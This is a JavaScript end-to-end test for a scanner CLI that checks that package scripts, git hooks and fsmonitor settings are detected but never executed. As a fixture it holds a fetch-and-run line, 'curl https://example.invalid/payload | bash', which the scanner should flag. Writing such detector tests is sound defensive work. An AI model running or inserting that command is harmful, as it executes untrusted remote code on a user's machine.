'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const CLI = path.join(__dirname, '../../bin/npa.js');
const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-canary-e2e-'));
const root = path.join(parent, 'root with spaces');
fs.mkdirSync(root);
function run(args) {
  return spawnSync(process.execPath, [CLI, 'canary-killer', ...args], {
    cwd: parent, encoding: 'utf8', timeout: 10000,
    env: { ...process.env, NO_COLOR: '1', NPA_DEBUG: '1' },
  });
}
function hash(file) { return crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex'); }

try {
  const marker = path.join(root, 'executed-marker');
  const script = path.join(root, 'canary.js');
  const manifest = path.join(root, 'package.json');
  fs.writeFileSync(script, `require('fs').writeFileSync(${JSON.stringify(marker)}, 'executed');\n`);
  fs.writeFileSync(manifest, '{\n "scripts": {"build": "node canary.js", "prepare": "node canary.js"}\n}');
  const before = [hash(script), hash(manifest)];
  let result = run([root, '--json']);
  assert.strictEqual(result.status, 0, result.stderr);
  let report = JSON.parse(result.stdout);
  assert.strictEqual(report.complete, true);
  assert.ok(report.references.every(r => r.status === 'exists'));
  assert.ok(report.findings.every(f => f.severity === 'indicator'));
  assert.strictEqual(fs.existsSync(marker), false, 'Scanned script must never execute');
  assert.deepStrictEqual([hash(script), hash(manifest)], before, 'Scan must not modify inputs');

  fs.writeFileSync(path.join(root, 'renamed.payload'), 'curl https://example.invalid/payload | bash\n');
  result = run([root, '--json']);
  report = JSON.parse(result.stdout);
  assert.strictEqual(result.status, 1);
  assert.ok(report.findings.some(f => f.name === 'remote-to-shell' && f.path.endsWith('renamed.payload')));
  result = run([root]);
  assert.strictEqual(result.status, 1);
  assert.ok(result.stdout.includes('renamed.payload:1'));
  assert.ok(result.stdout.includes('curl https://example.invalid/payload | bash'));
  assert.ok(!/\bclean\b/i.test(result.stdout));
  fs.writeFileSync(path.join(root, 'escaped.txt'), 'canary.js \x1b[31m\n');
  result = run([root]);
  assert.ok(result.stdout.includes('\\u001b'));
  assert.ok(!result.stdout.includes('\x1b'), 'Terminal control characters in scan evidence must be escaped');

  fs.mkdirSync(path.join(root, '.git', 'hooks'), { recursive: true });
  fs.writeFileSync(path.join(root, '.git', 'config'), '[core]\n fsmonitor = do-not-execute\n');
  fs.writeFileSync(path.join(root, '.git', 'hooks', 'pre-commit'), `#!/bin/sh\necho executed > "${marker}"\nnode deleted/canary.js\n`);
  result = run([root, '--json']);
  report = JSON.parse(result.stdout);
  assert.strictEqual(result.status, 2);
  assert.strictEqual(report.complete, false);
  assert.ok(report.references.some(r => r.path.endsWith('pre-commit') && r.status === 'missing'));
  assert.strictEqual(fs.existsSync(marker), false, 'Neither hook nor fsmonitor may execute');
  result = run([root]);
  assert.strictEqual(result.status, 2);
  assert.ok(result.stdout.includes('[unresolved]'));
  assert.ok(result.stderr.includes('Coverage is incomplete'));
  assert.ok(!/\bclean\b/i.test(result.stdout));

  result = run([root, '--exclude', script, '--json']);
  assert.strictEqual(result.status, 2);
  assert.ok(JSON.parse(result.stdout).exclusions.some(r => r.path === script));
  result = run(['--json']);
  assert.strictEqual(result.status, 2);
  assert.strictEqual(JSON.parse(result.stdout).complete, false);
  result = run([root, '--skip', '--json']);
  assert.strictEqual(result.status, 2);
  result = run([root, '--unknown', '--json']);
  assert.strictEqual(result.status, 2);
  result = run(['--help']);
  assert.strictEqual(result.status, 0);
  assert.ok(result.stdout.includes('explicit'));
  console.log('  canary-killer CLI: JSON/text, exit codes, explicit roots and non-execution passed');
} finally { fs.rmSync(parent, { recursive: true, force: true }); }

module.exports = Promise.resolve();
